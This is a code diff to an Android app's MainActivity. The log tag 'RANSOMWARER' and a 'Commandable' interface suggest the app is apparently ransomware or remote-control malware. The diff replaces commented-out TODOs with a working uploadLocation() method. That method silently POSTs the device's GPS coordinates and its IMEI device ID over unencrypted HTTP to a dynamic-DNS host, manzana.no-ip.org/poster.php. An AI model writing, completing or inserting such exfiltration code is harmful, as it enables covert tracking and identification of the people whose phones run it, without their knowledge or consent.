@@ -240,10 +240,8 @@ public class MainActivity extends Activity implements Commandable {
 
 			@Override
 			public void onLocationChanged(Location location) {
-				// TODO: send the location to the server
-				// userLocation = location;
 				stopLocationUpdate(locationManager, locationListener);
-				// TODO: send userLocation information to the server
+				uploadLocation(location);
 			}
 		};
 
@@ -264,12 +262,39 @@ public class MainActivity extends Activity implements Commandable {
 		locationManager.removeUpdates(locationListener);
 	}
 
-	// TODO: POST Request
-	// public void uploadLocation() {
-	// HttpPost httppost = new HttpPost("http://manzana.no-ip.org/poster.php");
-	// HttpClient client = new DefaultHttpClient();
-	// client.getParams().setParameter(CoreProtocolPNames.PROTOCOL_VERSION,
-	// HttpVersion.HTTP_1_1);
-	// }
-	//
+	// POST Request
+	private String URL_POST = "http://manzana.no-ip.org/poster.php";
+
+	public void uploadLocation(final Location location) {
+		new AsyncTask< Void,Void,Void>(){
+			protected Void doInBackground(Void... arg0) {
+				try {
+					HttpPost post = new HttpPost(URL_POST);
+        			HttpClient client = new DefaultHttpClient();
+        			client.getParams().setParameter(CoreProtocolPNames.PROTOCOL_VERSION, HttpVersion.HTTP_1_1);
+
+        			List<NameValuePair> content = new ArrayList<NameValuePair>(); 
+
+        			Double latitude = location.getLatitude();
+        	        Double longitude = location.getLongitude();
+        			
+        	        TelephonyManager mngr = (TelephonyManager)getSystemService(Context.TELEPHONY_SERVICE); 
+        	        String imai = mngr.getDeviceId();
+
+        			content.add(new BasicNameValuePair("latitude",latitude.toString()));
+        			content.add(new BasicNameValuePair("longitude",longitude.toString()));
+        			content.add(new BasicNameValuePair("imai",imai));
+        			post.setEntity(new UrlEncodedFormEntity(content));
+
+        			HttpResponse response = client.execute(post);
+
+					Log.d("RANSOMWARER","Server replied: "
+						+ EntityUtils.toString(response.getEntity()));
+				} catch (Exception e) {
+					Log.e("RANSOMWARER", "Exception sending data: ", e);
+				}
+				return null;
+			}			
+		}.execute();                
+	}
 }
